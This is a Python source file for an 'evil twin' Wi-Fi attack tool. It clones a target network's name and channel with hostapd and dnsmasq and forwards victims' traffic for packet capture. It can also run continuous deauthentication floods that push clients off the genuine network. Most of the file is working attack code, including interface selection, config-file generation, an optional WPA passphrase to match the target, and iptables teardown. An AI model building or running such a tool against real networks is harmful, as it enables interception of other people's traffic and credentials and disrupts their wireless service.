from sources import Sources
from changemode import ChangeMode
import os
import time
import multiprocessing
import subprocess

from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET



class EvilTwin3:
    def __init__(self):
        self.wireless_interface1 = ""
        self.wireless_mode1 = ""
        self.wireless_interface2 = ""
        self.wireless_mode2 = ""
        self.wireless_interface3 = ""
        self.target_network = {}
        self.start_eviltwin3()

    def start_eviltwin3(self):
        os.system("clear")
        print(f"{GREEN}\nFollowing Below are the 2 scenarios for this attack:::\n")
        print("0. Creating Fake AP of target network and Dos on target network and Capturing Data..")
        print("1. Creating only Fake AP and Capturing Data..")
        attack_type = input(f"\n [==] Select the type of attack by typing corresponding number: -->{RESET} ")
        if attack_type == "0":
            self.start_type_zero()
        elif attack_type == "1":
            self.start_type_one()

    def start_type_zero(self):
        source = Sources()
        list_of_interfaces = []
        list_of_interfaces = source.listinterfaces()
        try:
            interfaceinput =  input(f"\n{GREEN} Select wireless adapter for Fake access point. Type 0-{str(source.i - 1)} -->{RESET}")
            self.wireless_interface1 = list_of_interfaces[int(interfaceinput)]
            interfaceinput = input(f"\n{GREEN} Select wireless adapter for listening networks, Deauth Attack(Its mode would be changed to MOnitor). Type 0-{str(source.i - 1)} -->{RESET}")
            self.wireless_interface2 = list_of_interfaces[int(interfaceinput)]
            interfaceinput = input(f"\n{GREEN} Select interface for providing internet access to Access point. Type 0-{str(source.i - 1)} -->{RESET}")
            self.wireless_interface3 = list_of_interfaces[int(interfaceinput)]
        except (IndexError, ValueError) as e:
            print(f"{RED}[--] Please Select correct index number for wireless adaptor or Select Correct WIreless Adaptor...{RESET}")
            time.sleep(3) 
        else:
            self.wireless_mode1 = source.checkmode(self.wireless_interface1)
            self.wireless_mode2 = source.checkmode(self.wireless_interface2)
            wireless_interface2_manufacturer = source.get_interface_menufacturer_name(self.wireless_interface2)
            wireless_interface2_mac_address = source.get_dev_path(self.wireless_interface2)
            ifindex = source.get_ifindex(self.wireless_interface2)
            if self.wireless_mode2 == "Managed":
                ChangeMode().changetomonitormode(self.wireless_interface2)
            list_of_interfaces = source.listinterfaces()
            os.system("clear")
            for interface in list_of_interfaces:
                if (wireless_interface2_mac_address == source.get_dev_path(interface) or ifindex == Sources().get_ifindex(interface)) and wireless_interface2_manufacturer == source.get_interface_menufacturer_name(interface) and source.checkmode(interface) == "Monitor":
                    self.wireless_interface2 = interface
            self.wireless_mode2 = source.checkmode(self.wireless_interface2)
            try:        
                self.target_network = source.select_network(self.wireless_interface2)
                os.system("clear")
                if "OPN" in self.target_network["encryption"]:
                    print(f"\n{BLUE}[==] Target Network is OPEN...{RESET}\n")
                    self.open_access_point()
                    Sources().change_interface_channel(self.wireless_interface2,self.target_network["channel"])
                    os.system("clear")
                    deauth = multiprocessing.Process(target=Sources().deauth, args=(self.wireless_interface2,self.target_network["bssid"],"0", ))
                    deauth.start()
                    print(f"{GREEN}[+][+]Starting Capturing Packets......{RESET}")
                    print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")
                    Sources().mitm_attacks(self.wireless_interface1)
                    
                else:
                    encrypt = self.target_network["encryption"]
                    print(f"\n{BLUE}[==] Target Network have Encrytion {encrypt}\n")
                    print("\n[--] As, Target Network have encryption. It is recommanded to create Access Point with Encryption if you Know the password of target network:")
                    print("\n[++] You want to create: \n")
                    print("0. Access Point with Encrytions that will require authentication..")
                    print("1. OPEN Access Point..")
                    type_of_AP = input(f" Select the type of Access Point to be created: Type corresponding number. -->{RESET} ")
                    if type_of_AP == "0":
                        pass_for_AP = input(f"{GREEN}[==] Provide the Password for AP. It should be samilar to target network to make the whole attack work perfectly if you want to make AP similar to a target network . -->{RESET} ")
                        self.encrypt_access_point(pass_for_AP)
                        Sources().change_interface_channel(self.wireless_interface2,self.target_network["channel"])
                        os.system("clear")
                        deauth = multiprocessing.Process(target=Sources().deauth, args=(self.wireless_interface2,self.target_network["bssid"],"0", ))
                        deauth.start()
                        print(f"{GREEN}[+][+]Starting Capturing Packets......{RESET}")
                        print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")
                            
                        Sources().mitm_attacks(self.wireless_interface1)
        
                            
                    elif type_of_AP == "1":
                        self.open_access_point()
                        Sources().change_interface_channel(self.wireless_interface2,self.target_network["channel"])
                        os.system("clear")
                        deauth = multiprocessing.Process(target=Sources().deauth, args=(self.wireless_interface2,self.target_network["bssid"],"0", ))
                        deauth.start()
                        print(f"{GREEN}[+][+]Starting Capturing Packets......{RESET}")
                        print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")
                        Sources().mitm_attacks(self.wireless_interface1)
            except KeyboardInterrupt:
                os.system("clear")
                print(f"\n{GREEN}[+]Want to close the whole Attack:::")
                close = input(f" \tType 'y' for Yes and 'n' for no  >>{RESET}").lower()
                if close == "y":
                    self.closing_access_point()
                time.sleep(1)
                os.system("clear")
            except Exception as e:
                print(f"{RED}Following Error Occur:>>  {e}{RESET}")
                print(f"{RED}[--] It may be due to not selecting correct wireless adaptor or target network or some other issues. TRY AGAIN!!!!{RESET}")
                print(f"{RED}Closing Whole Attack:: {RESET}")
                self.closing_access_point()
                time.sleep(2)
            else:
                check = 1
                while check == 1:
                    try:
                        Sources().kill_process("hostapd")
                        time.sleep(1)
                        print("\n\nDue to some issue with hostapd connection was not working properly so configuring Again and Capturing Data....")
                        os.system("hostapd hostapd.conf -B")
                        print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")
                        Sources().mitm_attacks(self.wireless_interface1)
                    except KeyboardInterrupt:
                        check = 0
                        os.system("clear")
                        print(f"\n{GREEN}[+]Want to close the whole Attack:::")
                        close = input(f" \tType 'y' for Yes and 'n' for no  >>{RESET}").lower()
                        if close == "y":
                            self.closing_access_point()
                        time.sleep(1)
                        os.system("clear")
                    except Exception as e:
                        print(f"{RED}Following Error Occur:>>  {e}{RESET}")
                        print(f"{RED}[--] It may be due to not selecting correct wireless adaptor or target network or some other issues. TRY AGAIN!!!!{RESET}")
                        print(f"{RED}Closing Whole Attack:: {RESET}")
                        self.closing_access_point()
                        time.sleep(2)
                    else:
                        pass
                

    def start_type_one(self):
        source = Sources()
        list_of_interfaces = []
        list_of_interfaces = source.listinterfaces()
        try:
            interfaceinput =  input(f"\n{GREEN} Select wireless adapter for Fake access point. Type 0-{str(source.i - 1)} -->{RESET}")
            self.wireless_interface1 = list_of_interfaces[int(interfaceinput)]
            interfaceinput = input(f"\n{GREEN} Select interface for providing internet access to Access point. Type 0-{str(source.i - 1)} -->{RESET}")
            self.wireless_interface3 = list_of_interfaces[int(interfaceinput)]
        except (IndexError, ValueError) as e:
            print(f"{RED}[--] Please Select correct index number for wireless adaptor or Select Correct WIreless Adaptor...{RESET}")
            time.sleep(3) 
        else:
            os.system("clear")
            network_name = input(f"\n{GREEN}[++] Provide the name of Access Point. -->{RESET} ")
            channel_number = input(f"{GREEN}[++] Provide the channel number for Access Point. -->{RESET} ")
            self.target_network["ssid"] = network_name
            self.target_network["channel"] = channel_number
            os.system("clear")
            try:
                print(f"\n{GREEN}You want to create: \n")
                print("0. Access Point with Encrytions that will require authentication..")
                print("1. OPEN Access Point..")
                type_of_AP = input(f" Select the type of Access Point to be created: Type corresponding number. -->{RESET} ")
                if type_of_AP == "0":
                    pass_for_AP = input(f"{GREEN}[==] Provide the Password for AP. It should be samilar to target network to make the whole attack work perfectly if you want to make AP similar to a target network . -->{RESET} ")
                    self.encrypt_access_point(pass_for_AP)
                    os.system("clear")
                    print(f"{GREEN}[+][+]Starting Capturing Packets......{RESET}")
                    print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")

                    Sources().mitm_attacks(self.wireless_interface1)
                elif type_of_AP == "1":
                    self.open_access_point()
                    os.system("clear")
                    print(f"{GREEN}[+][+]Starting Capturing Packets......{RESET}")
                    print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")

                    Sources().mitm_attacks(self.wireless_interface1)

                
            except Exception as e:
                print(f"{RED}Following Error Occur:>>  {e}{RESET}")
                print(f"{RED}[--] It may be due to not selecting correct wireless adaptor or target network or some other issues. TRY AGAIN!!!!{RESET}")
                print(f"{RED}Closing Whole Attack:: {RESET}")
                self.closing_access_point()
                time.sleep(2)
            except KeyboardInterrupt:
                os.system("clear")
                print(f"\n{GREEN}[+]Want to close the whole Attack:::")
                close = input(f" \tType 'y' for Yes and 'n' for no  >>{RESET}").lower()
                if close == "y":
                    self.closing_access_point()
                time.sleep(1)
                os.system("clear")
            else:
                check = 1
                while check == 1:
                    try:
                        Sources().kill_process("hostapd")
                        time.sleep(1)
                        print("\n\nDue to some issue with hostapd connection was not working properly so configuring Again and Capturing Data....")
                        os.system("hostapd hostapd.conf -B")
                        print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")
                        Sources().mitm_attacks(self.wireless_interface1)
                    except KeyboardInterrupt:
                        check = 0
                        os.system("clear")
                        print(f"\n{GREEN}[+]Want to close the whole Attack:::")
                        close = input(f" \tType 'y' for Yes and 'n' for no  >>{RESET}").lower()
                        if close == "y":
                            self.closing_access_point()
                        time.sleep(1)
                        os.system("clear")
                    except Exception as e:
                        print(f"{RED}Following Error Occur:>>  {e}{RESET}")
                        print(f"{RED}[--] It may be due to not selecting correct wireless adaptor or target network or some other issues. TRY AGAIN!!!!{RESET}")
                        print(f"{RED}Closing Whole Attack:: {RESET}")
                        self.closing_access_point()
                        time.sleep(2)
                    else:
                        pass



    def open_access_point(self):
        self.encrypt_open_ap_configue_files(self.wireless_interface1,self.target_network["ssid"],self.target_network["channel"])
        Sources().disconnect_to_open_wifi(self.wireless_interface1)
        Sources().provide_internet(self.wireless_interface3,self.wireless_interface1)
        self.access_point(self.wireless_interface1)
        
        


    def encrypt_access_point(self,pass_for_AP):
        self.encrypt_open_ap_configue_files(self.wireless_interface1,self.target_network["ssid"],self.target_network["channel"],password=pass_for_AP,encrypt_AP=1)
        Sources().disconnect_to_open_wifi(self.wireless_interface1)
        Sources().provide_internet(self.wireless_interface3,self.wireless_interface1)
        self.access_point(self.wireless_interface1)
        

    def access_point(self,network_interface):       
        print(f"{GREEN}[+] Starting DNS Serve.....{RESET}")
        result = subprocess.run(f"dnsmasq -C dnsmasq.conf", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"{GREEN}[+] Configuring IP Range.....{RESET}")
        result = subprocess.run(f"ifconfig {network_interface} 192.168.1.1/24", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"{GREEN}[+] Starting Access Point .....{RESET}\n")
        os.system("hostapd hostapd.conf -B")
        time.sleep(2)

    def encrypt_open_ap_configue_files(self,interface,target_network,channel,password="",encrypt_AP=0):
        dnsfile = "dnsmasq.conf"
        hostfile = "hostapd.conf"

        encrypt_lines = f"wpa=2\nwpa_passphrase={password}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP"


        print(f"\n{GREEN}[+]Creating Configuration file for DNS server......{RESET}")
        try:
            with open(dnsfile, 'w') as f:
                f.write(f"interface={interface}\ndhcp-range=192.168.1.2,192.168.1.250,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\nserver=8.8.4.4\nlisten-address=127.0.0.1\nlisten-address=192.168.1.1")
            print(f"{GREEN}[+]File {dnsfile} created successfully.{RESET}")
        except IOError:
            print(f"{RED}[-]Error: could not create file {dnsfile}{RESET}")

        if encrypt_AP==1:
            hostfile_content = f"interface={interface}\nssid={target_network}\nchannel={channel}\ndriver=nl80211\nhw_mode=g\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n{encrypt_lines}"
        else:
            hostfile_content = f"interface={interface}\nssid={target_network}\nchannel={channel}\ndriver=nl80211\nhw_mode=g\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
        
        print(f"\n{GREEN}[+]Creating Configuration file for Access point......{RESET}")
        try:
            with open(hostfile, 'w') as f:
                f.write(hostfile_content)
            print(f"{GREEN}[+]File {hostfile} created successfully.{RESET}")
        except IOError:
            print(f"{RED}[-]Error: could not create file {hostfile}.{RESET}")

    def closing_access_point(self):
        print(f"{RED}[-] Closing Access point and Deauth Attack.....{RESET}")
        Sources().kill_process("hostapd")
        Sources().kill_process("dnsmasq")
        Sources().kill_process("aireplay-ng")
        result = subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True, capture_output=True, text=True)
        print(result.stderr)
        result = subprocess.run("iptables --flush", shell=True, capture_output=True, text=True)
        result = subprocess.run("iptables --table nat --flush", shell=True, capture_output=True, text=True)
        result = subprocess.run("iptables --delete-chain", shell=True, capture_output=True, text=True)
        result = subprocess.run("iptables --table nat --delete-chain", shell=True, capture_output=True, text=True)